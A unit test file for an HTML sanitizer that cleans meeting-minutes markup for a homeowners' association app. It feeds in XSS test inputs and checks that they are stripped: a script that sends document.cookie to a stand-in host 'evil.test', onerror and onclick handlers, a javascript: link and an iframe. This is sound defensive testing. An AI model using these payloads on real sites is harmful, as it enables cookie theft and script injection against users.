import { sanitizeMinutesHtml } from "./sanitize";

describe("sanitizeMinutesHtml", () => {
  describe("strips injection vectors", () => {
    it("removes a script tag and its body entirely", () => {
      const out = sanitizeMinutesHtml(
        '<p>Notes</p><script>fetch("https://evil.test/"+document.cookie)</script>'
      );
      expect(out).not.toMatch(/<script/i);
      expect(out).not.toContain("evil.test");
      expect(out).toContain("<p>Notes</p>");
    });

    it("removes an img with an onerror handler", () => {
      const out = sanitizeMinutesHtml('<img src="x" onerror="alert(1)">');
      expect(out).not.toMatch(/<img/i);
      expect(out).not.toContain("onerror");
    });

    it("strips event handler attributes from allowed tags", () => {
      const out = sanitizeMinutesHtml(
        '<p onclick="alert(1)" onmouseover="alert(2)">Report</p>'
      );
      expect(out).toBe("<p>Report</p>");
    });

    it("drops a javascript: href but keeps the link text", () => {
      const out = sanitizeMinutesHtml(
        '<a href="javascript:alert(1)">Click</a>'
      );
      expect(out).not.toContain("javascript:");
      expect(out).toContain("Click");
    });

    it("removes iframe, object, and style tags", () => {
      const out = sanitizeMinutesHtml(
        '<iframe src="https://evil.test"></iframe>' +
          "<object data=\"x\"></object>" +
          "<style>body{display:none}</style><p>Real</p>"
      );
      expect(out).not.toMatch(/<iframe|<object|<style/i);
      expect(out).not.toContain("display:none");
      expect(out).toBe("<p>Real</p>");
    });

    it("strips a style attribute used to overlay the page", () => {
      const out = sanitizeMinutesHtml(
        '<p style="position:fixed;inset:0;background:red">Gotcha</p>'
      );
      expect(out).toBe("<p>Gotcha</p>");
    });

    it("does not leave a usable tag when handlers are split across case", () => {
      const out = sanitizeMinutesHtml('<P OnClick="alert(1)">Hi</P>');
      expect(out.toLowerCase()).not.toContain("onclick");
    });
  });

  describe("preserves legitimate Tiptap output", () => {
    it("keeps headings, paragraphs, and inline emphasis", () => {
      const html =
        "<h2>Old Business</h2><p>Pool gate <strong>approved</strong> and <em>funded</em>.</p>";
      expect(sanitizeMinutesHtml(html)).toBe(html);
    });

    it("keeps lists and blockquotes", () => {
      const html =
        "<ul><li>Approve minutes</li></ul><ol><li>First</li></ol><blockquote><p>Quoted</p></blockquote>";
      expect(sanitizeMinutesHtml(html)).toBe(html);
    });

    it("keeps horizontal rules and line breaks", () => {
      expect(sanitizeMinutesHtml("<hr><p>After<br>Break</p>")).toBe(
        "<hr /><p>After<br />Break</p>"
      );
    });

    it("keeps an https link and forces rel=noopener noreferrer", () => {
      const out = sanitizeMinutesHtml(
        '<a href="https://drive.google.com/doc">View minutes</a>'
      );
      expect(out).toContain('href="https://drive.google.com/doc"');
      expect(out).toContain('rel="noopener noreferrer"');
      expect(out).toContain("View minutes");
    });

    it("keeps a mailto link", () => {
      const out = sanitizeMinutesHtml('<a href="mailto:board@hoa.test">Email</a>');
      expect(out).toContain("mailto:board@hoa.test");
    });

    it("leaves the real agenda scaffold intact", () => {
      const scaffold =
        "<h2>Call to Order</h2><p>Called to order by President, seconded by Pool.</p>" +
        "<h2>Board Reports</h2><h3>Treasurer</h3><p>—</p>" +
        "<h2>New Business</h2><p><em>None.</em></p><h2>Adjournment</h2><p></p>";
      expect(sanitizeMinutesHtml(scaffold)).toBe(scaffold);
    });

    it("returns an empty string unchanged", () => {
      expect(sanitizeMinutesHtml("")).toBe("");
    });
  });
});
